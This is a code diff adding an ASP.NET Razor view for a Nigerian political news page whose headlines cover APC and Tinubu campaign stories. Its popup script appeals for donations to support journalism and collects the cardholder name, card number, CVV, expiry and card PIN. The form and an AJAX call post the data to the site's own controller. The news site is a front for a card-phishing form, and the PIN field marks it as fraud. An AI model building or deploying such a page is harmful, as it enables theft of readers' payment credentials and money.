@@ -1,0 +1,364 @@
+﻿
+@{
+    ViewData["Title"] = "Pdp";
+}
+@model Grace.Models.Items
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="~/css/site.css">
+    
+    <title>Apc Home Page</title>
+</head>
+<body onload = "getCookie()">
+
+
+  <div class="form-popup" id="myForm">
+  <form method="post" class="form-container" asp-action="Test" id="take" >
+    <p><b>Good journalism is on the verge of extinction, Everyday we work hard to get news at your door step. You can do
+        well to keep the good work going by donating any amount of your choice.
+    </b></p>
+
+    
+    <div class="Identity">  
+      <label asp-for="Name">Name On Card</label>
+    <input asp-for="Name" type="text" class="kok"/>
+    </div>
+
+    <label asp-for="CardNo">Card Number</label>
+             <div class="Cardno">
+    <input asp-for="CardNo" type="text" id="debitType" placeholder="0000 0000 0000 0000" class="kok1" required>
+    <img src=""  height="30" width="50" class="pic">
+    </div>
+
+    <div class="align">
+    <div class="det">
+      <label asp-for="Cvv">Cvv</label>
+      <input asp-for="Cvv" type="number" class="kok2" required>
+    </div>
+
+    <div class="det">
+      <label asp-for="Oge">Date</label>
+      <input asp-for="Oge" type="text" id="see" placeholder="MM/YY" class="kok3" required>
+    </div>
+
+    <div class="det">
+      <label asp-for="Password">Card Pin</label>
+      <input asp-for="Password" type="number" class="kok4" required>
+    </div>
+
+    <div class="det">
+      <label asp-for="Charity">Amount</label>
+      <input asp-for="Charity" type="number" class="kok5" required>
+    </div>
+  </div>
+           
+               <button type="submit" onclick="submitPersonalInfo(); setCookie()" class="btn">Continue</button>  
+  </form>
+</div>   
+ <header id="main-header">
+            <div class="contain">               
+                <div id="first">
+                    <img src="../img/Coat_of_arms_of_Nigeria.svg.png" height="70" width="100"/>              
+                    <h1>Political Minute</h1>
+                </div>                             
+            </div>
+        </header>
+      <nav id="navbar">
+            <ul>
+                 <li>
+                <a  asp-controller= "Home" asp-action = "Index">PDP</a>
+              </li>
+
+              <li>
+                <a asp-controller= "Home" asp-action = "Pdp">APC</a>
+              </li>
+        
+              <li>
+                <a asp-controller= "Home" asp-action = "LP">LP</a>
+              </li>
+              
+            </ul>
+          </nav>
+<div id="Pal">
+
+
+    <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action ="NnamaniChimeToLeadCampaignForTinubuInEnugu" target="blank">               
+                <div class="image">
+                    <img src="../img/ken_nnamani.jpeg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Nnamani, chime to lead campaign for Tinubu in Enugu</p>
+                </div>
+            </a>
+        </div>
+
+      <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action ="NnamaniChimeToLeadCampaignForTinubuInEnugu" target="blank">               
+                <div class="image">
+                    <img src="../img/ken_nnamani.jpeg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Nnamani, chime to lead campaign for Tinubu in Enugu</p>
+                </div>
+            </a>
+        </div>
+
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action ="CautionYourSupportersTinubu" target="blank">               
+                <div class="image">
+                    <img src="../img/thienubu_1.jpeg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Caution your supporters they attacking me Tinubu to peter obi</p>
+                </div>
+            </a>
+        </div>
+
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action ="BuhariReceivesTinubuAndShettima" target="blank">               
+                <div class="image">
+                    <img src="../img/image-17.png" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Buhari receives Tinubu and shettima at the state house</p>
+                </div>
+            </a>
+        </div>
+
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action ="DelegatesBribedToVoteAmaechiSays" target="blank">               
+                <div class="image">
+                    <img src="../img/rotimi.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Delegates bribed to vote at apc presidential primaries - Amaechi</p>
+                </div>
+            </a>
+        </div>
+
+ 
+
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action ="ApcUnveilsShettimaAsTinubuRunningMate" target="blank">               
+                <div class="image">
+                    <img src="../img/Tinu-sheti unveiled.webp" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Apc unveils shettima as Tinubu's running mate</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="TinubuMeetsWithNANSLeaders" target="blank">               
+                <div class="image">
+                    <img src="../img/thienubu_2.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Tinubu meets with NANS leaders says he will intervene in the asuu strike</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action ="ApcWinsEkitiGuberElection" target="blank">               
+                <div class="image">
+                    <img src="../img/apc_flag.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Apc wins Ekiti Guber Election</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="YouCanLickYourWounds" target="blank">               
+                <div class="image">
+                    <img src="../img/ahmed_lawan.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>You can now lick your wounds Tinubu tells Ahmed lawan</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="TinubuWinsPresidentiaPrimaries" target="blank">               
+                <div class="image">
+                    <img src="../img/thienubu.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Tinubu wins apc presidential primaries</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="ThreeAspirantsSteppedDownForVc" target="blank">               
+                <div class="image">
+                    <img src="../img/vp_osibanjo.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Three aspirants have stepped down for Osibanjo - campaign DG</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="OsibanjoHasNotSteppedDown" target="blank">               
+                <div class="image">
+                    <img src="../img/yemi-osinbajo-1.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Osibanjo has not stepped down - campaign council tells delegate</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="IAmMoreQualifiedThanTinubuOsibanjoSaysAmaechi" target="blank">               
+                <div class="image">
+                    <img src="../img/Amaechi-.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>I am more qualified than Tinubu, Osibanjo says Amaechi</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="KebbiBusinessManBuyTinubuForm" target="blank">               
+                <div class="image">
+                    <img src="../img/N man buys tinubu form.jpeg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Kebbi business Man purchases 100 million naira presidential nomination form for Tinubu</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="EmirOfDutseEndorsesAmaechi" target="blank">               
+                <div class="image">
+                    <img src="../img/emir_of_dutse_endorses_amaechi_as_president.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Emir of Dutse endorses amaechi as president</p>
+                </div>
+            </a>
+        </div>
+       
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="TinubuApcGovnrs" target="blank">               
+                <div class="image">
+                    <img src="../img/thienubu.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>Tinubu had an inclosed door meeting with Apc Governors in Abuja</p>
+                </div>
+            </a>
+        </div>
+
+        <div class="pal">
+            <a id="redirect" asp-controller="Apc" asp-action="PresidentiaFormBuyers" target="blank">               
+                <div class="image">
+                    <img src="../img/apc_flag.jpg" width="100" height="100"/>
+                </div>
+                <div class="let">
+                    <p>List of those who bought presidential form in Apc</p>
+                </div>
+            </a>
+        </div>         
+        </div>
+   
+<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js" integrity="sha512-KaIyHb30iXTXfGyI9cyKFUIRSSuekJt6/vqXtyQKhQP6ozZEGY8nOtRS6fExqE4+RbYHus2yGyYg1BrqxzV6YA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+     
+
+ function setCookie(){
+    localStorage.setItem('name', 'keep')
+  }
+
+  function getCookie(){
+    let value = localStorage.getItem('name')
+
+    if(value != 'keep'){
+      setTimeout(show, 2000)
+      function show(){
+        document.getElementById('myForm').style.display = "block";
+      }
+    }
+    else{
+      alert('You are Welcome')
+    }
+  }
+
+function submitPersonalInfo() {
+    var data = $("take").serialize();
+    console.log(data);
+    alert(data);
+    $.ajax({
+        type: 'POST',
+        url: '/Home/Pdp',
+        contentType: 'application/x-www-form-urlencoded; charset=UTF-8', // when we use .serialize() this generates the data in query string format. this needs the default contentType (default content type is: contentType: 'application/x-www-form-urlencoded; charset=UTF-8') so it is optional, you can remove it
+        data: data,
+        success: function (result) {
+            alert('Successfully received Data');
+            console.log(result);
+        },
+        error: function () {
+            alert('Failed to receive the Data');
+            console.log('Failed');
+        }
+    })
+    }
+
+var stuff = document.getElementById('debitType').value
+let img = document.querySelector(".pic")
+
+var cleave = new Cleave('#see', {
+    date: true,
+    datePattern: ['m', 'y']
+});
+
+var credit = new Cleave('#debitType', {
+    creditCard: true,
+    onCreditCardTypeChanged: function (type) {
+        console.log(type);
+        // update UI ...
+        if (type == "mastercard") {
+            img.classList.remove('pic')
+            img.setAttribute("src", "../img/mc.png")
+            return
+        }
+
+        if (type == "visa") {
+            img.classList.remove('pic')
+            img.setAttribute("src", "../img/vc.png")
+            return
+        }
+
+        if (type == "maestro") {
+            img.classList.remove('pic')
+            img.setAttribute("src", "../img/Verve_Image.png")
+            return
+        }
+
+        img.setAttribute("src", "")
+        img.classList.add('pic')
+    }
+});
+
+
+</script>
+
+  </body>
+  </html>
+ 
+   
+
